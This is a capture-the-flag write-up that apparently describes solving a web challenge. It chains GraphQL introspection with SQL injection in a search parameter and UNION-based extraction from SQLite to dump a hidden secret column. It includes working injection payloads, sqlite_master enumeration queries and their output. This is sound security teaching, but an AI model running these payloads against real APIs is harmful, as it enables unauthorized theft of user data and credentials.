# Silent Oracle - 0xV01D CTF 2026

> *A quiet internal directory exposes only a small public surface. The useful answers are hidden behind how the service thinks about people and roles.*

**Difficulty:** Medium  
**Category:** Web Exploitation  
**Attack Chain:** `GraphQL Introspection` -> `SQLi` -> `UNION-based data extraction`

---

## What Was Vulnerable

A small internal directory exposed a GraphQL endpoint vulnerable to introspection. Its `search` parameter passed user input directly to a SQL query without sanitization, allowing UNION-based injection and extraction of a hidden `secret` column that was never exposed through the GraphQL schema.

---

## How I Found It

### 1. Reconnaissance

On visiting the website it revealed:

> *Shadow Directory - A small internal directory exposed a GraphQL endpoint. The public fields look harmless.*

It had a query editor pre-loaded with:

```graphql
query {
  users(search: "a") {
    id
    username
    displayName
    role
    bio
  }
}
```

Clicking "Run Query" returned 3 users:

```json
{
  "data": {
    "users": [
      { "id": "2", "username": "mira", "displayName": "Mira Stone", "role": "analyst", "bio": "Maintains onboarding notes for new operators." },
      { "id": "3", "username": "rakan", "displayName": "Rakan Vale", "role": "engineer", "bio": "Keeps legacy services alive during migrations." },
      { "id": "4", "username": "admin", "displayName": "Directory Admin", "role": "admin", "bio": "Private administrative account." }
    ]
  }
}
```

### 2. Testing

The `search` parameter immediately looked interesting. I started probing it.

Tried querying a non-existent type with an incomplete query:

```graphql
query {
  data(search: "flag") {
  }
}
```

Got a syntax error - GraphQL queries need to be syntactically complete and specify fields to return.

Tried querying hidden fields on the admin user:

```graphql
query {
  users(id: "4") {
    id
    username
    displayName
    role
    bio
    flag
    secret
    password
    token
  }
}
```

Returned `"Cannot query field 'x' on type 'User'."` for each extra field - confirming no hidden fields are exposed through the schema.

Also tried searching for common strings:

```graphql
users(search: "flag")
users(search: "0xV01D")
users(search: "secret")
users(search: "hidden")
users(search: "vault")
```

All returned empty `[]`.

### 3. GraphQL Introspection

After researching GraphQL I came across **GraphQL Introspection** - a built-in feature that lets you query the API about itself and map the entire API structure, which is great for increasing attack surface visibility.

The following query asks the server for every type in the schema and every field inside each type:

```graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

Key findings from the response:

| Type | Fields |
|------|--------|
| `User` | id, username, displayName, role, bio |
| `Query` | **users**, **about** |

Inspecting the `about` field returned a generic response:

```json
{
  "data": {
    "about": "Shadow Directory exposes a small public employee search API."
  }
}
```

Thought maybe it returns different content based on who is asking, so I tried passing roles as arguments:

```graphql
about(role: "admin")
about(username: "admin")
about(id: "4")
```

All returned `"Unknown argument 'x' on field 'Query.about'."` - dead end.

Everything felt lost. Then I thought of going back to the `search` parameter and tried searching for an empty string:

```graphql
query {
  users(search: "") {
    id
    username
    displayName
    role
    bio
  }
}
```

To my surprise it returned a 4th user that wasn't in the original results - `Guest User` with role `viewer`.

---

## The Exploit

### Step 1 - SQL Injection Confirmation

I injected a classic SQLi payload into the search parameter:

```graphql
query {
  users(search: "' OR '1'='1") {
    id
    username
    displayName
    role
    bio
  }
}
```

All 4 users were returned - confirming SQL injection in the search parameter. The input is passed directly to the database without sanitization. It still only shows the same 4 users though, so I needed to go deeper.

### Step 2 - UNION-based Injection

With 5 known GraphQL fields, I tried a UNION payload with 5 columns:

```graphql
query {
  users(search: "' UNION SELECT 1,2,3,4,5-- -") {
    id
    username
    displayName
    role
    bio
  }
}
```

The injected values `1,2,3,4,5` appeared in the response - UNION injection confirmed. This tells me which position in the UNION maps to which GraphQL field:

**Column Mapping:**

| Position | GraphQL Field |
|----------|---------------|
| 1 | id |
| 2 | username |
| 3 | displayName |
| 4 | role |
| 5 | bio |

### Step 3 - Database Enumeration

I tried MySQL's `information_schema.tables` first:

```graphql
users(search: "' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables-- -")
```

Got an error: `"no such table: information_schema.tables"` - this is **SQLite**, not MySQL. SQLite uses a different system table for schema enumeration.

SQLite equivalent - `sqlite_master`:

```graphql
query {
  users(search: "' UNION SELECT 1,name,3,4,5 FROM sqlite_master WHERE type='table'-- -") {
    id
    username
    displayName
    role
    bio
  }
}
```

3 tables discovered: `audit_log`, `sqlite_sequence`, `users`

### Step 4 - Extracting the Schema

Starting with `audit_log`:

```graphql
query {
  users(search: "' UNION SELECT 1,sql,3,4,5 FROM sqlite_master WHERE name='audit_log'-- -") {
    id
    username
    displayName
    role
    bio
  }
}
```

```
CREATE TABLE audit_log (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  event TEXT NOT NULL,
  created_by TEXT NOT NULL
)
```

Dumped its contents:

```graphql
query {
  users(search: "' UNION SELECT 1,event,3,created_by,5 FROM audit_log-- -") {
    id
    username
    displayName
    role
    bio
  }
}
```

```json
{
  "username": "directory service deployed", "role": "admin"
  "username": "public GraphQL endpoint enabled", "role": "mira"
  "username": "search resolver patched quickly before launch", "role": "rakan"
}
```

Deployment events - interesting context but no flag. Moved on to `users`.

Extracted the `users` table schema:

```graphql
query {
  users(search: "' UNION SELECT 1,sql,3,4,5 FROM sqlite_master WHERE name='users'-- -") {
    id
    username
    displayName
    role
    bio
  }
}
```

```
CREATE TABLE users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT NOT NULL UNIQUE,
  display_name TEXT NOT NULL,
  role TEXT NOT NULL,
  bio TEXT NOT NULL,
  secret TEXT NOT NULL    <-- not exposed in the GraphQL schema
)
```

A `secret` column exists that never appeared anywhere in the GraphQL schema. Also noticed the database column is `display_name` while GraphQL exposes it as `displayName` - likely an alias.

### Step 5 - Extracting the Flag

```graphql
query {
  users(search: "' UNION SELECT 1,secret,3,4,5 FROM users-- -") {
    id
    username
    displayName
    role
    bio
  }
}
```

The `username` field now contains the `secret` column values:

```
0xV01D{d21683da-5051-46d1-bc2f-6055320421fe}  <-- FLAG
debug token rotated last quarter
favorite report: weekly-metrics
no secrets here
```

**Flag:** `0xV01D{d21683da-5051-46d1-bc2f-6055320421fe}`

---

## Techniques Used

1. GraphQL Introspection to map the full API structure
2. SQL Injection through a GraphQL search parameter
3. Database fingerprinting to identify SQLite from an error message
4. SQLite schema enumeration via `sqlite_master`
5. UNION-based extraction across multiple tables
6. Schema analysis to find hidden columns not exposed by the API

---

## Real World Impact

In a real application, a GraphQL endpoint with an unsanitized search parameter could expose an entire user database including credentials, private tokens, and sensitive account data. An attacker could enumerate all users, extract password hashes, or retrieve API keys - all without authentication. The gap between what the GraphQL schema exposes and what the database actually contains is a critical blind spot that developers often overlook.

---

## Lessons Learned

1. GraphQL queries need to be syntactically complete - always specify fields to return
2. GraphQL Introspection is a powerful recon tool - always try it before assuming the schema is complete
3. Don't fixate on the obvious target - the admin account looked interesting but the real vulnerability was in the search parameter
4. Searching with an empty string can reveal data that filtered searches hide
5. SQLi is possible through GraphQL - the transport layer does not protect against it
6. Database fingerprinting matters - `information_schema` failing told me exactly what database I was dealing with
7. `sqlite_master` is extremely useful for schema enumeration in SQLite databases
8. Hidden columns like `secret` are invisible at the API layer but fully accessible via UNION injection - always check the raw schema

---

*Written by [Faisal Ulde](https://github.com/faisalulde) | 0xV01D CTF 2026*
